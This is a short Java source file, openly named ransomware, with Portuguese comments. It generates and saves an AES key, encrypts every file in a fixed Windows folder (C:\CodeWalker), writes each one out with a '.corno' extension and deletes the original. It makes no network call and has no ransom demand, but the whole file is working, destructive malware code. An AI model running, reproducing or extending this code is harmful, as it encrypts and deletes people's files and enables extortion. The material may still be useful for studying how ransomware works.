package ransomware;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class Ransomware {

	public static void main(String[] args) throws NoSuchAlgorithmException, IOException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
		// Gerar chave de criptografia/descriptografia (simétrica) e salvar
		KeyGenerator keyGen = KeyGenerator.getInstance("AES");
		keyGen.init(128, new SecureRandom());
		SecretKey key = keyGen.generateKey();
		FileOutputStream key_out = new FileOutputStream("..\\chaveAES.key");
		key_out.write(key.getEncoded()); // Salva os bytes da chave
		key_out.close();
		
		// Ler chave que está salva
		FileInputStream key_in = new FileInputStream("..\\chaveAES.key");
		byte[] keyBytes = key_in.readAllBytes();
		key_in.close();
		SecretKey readKey = new SecretKeySpec(keyBytes, "AES"); // Recontrói a chave na SecretKey
		
		// Inicializar a criptografia
		Cipher cifra = Cipher.getInstance("AES");
		cifra.init(Cipher.ENCRYPT_MODE, readKey);
		
		
		
		File raiz = new File("C:\\CodeWalker"); // Definindo raiz
		File[] arquivos = raiz.listFiles(); // Lendo arquivos da raiz
		if(arquivos != null) { // Verificar si tem arquivos na raiz
			for(File arquivo : arquivos) { // Lendo/Escrevendo o array
				if(arquivo.isDirectory()) { // Verifica si o arquivo é um diretório
					continue;
				} else {	
					// Leitura do arquivo original
					FileInputStream fis = new FileInputStream(arquivo);
					byte[] arquivoOriginal = fis.readAllBytes();
					fis.close();
					
					// Criptografia do arquivo
					byte[] arquivoCriptografado = cifra.doFinal(arquivoOriginal);
					
					// Salva no arquivo criptografado
					FileOutputStream fos = new FileOutputStream(arquivo + ".corno");
					fos.write(arquivoCriptografado);
					fos.close();
					
					// Deleta o arquivo original
					arquivo.delete();
				}
			}
		} else {
			System.out.println("Erro ao ler raiz");
		}
	}

}
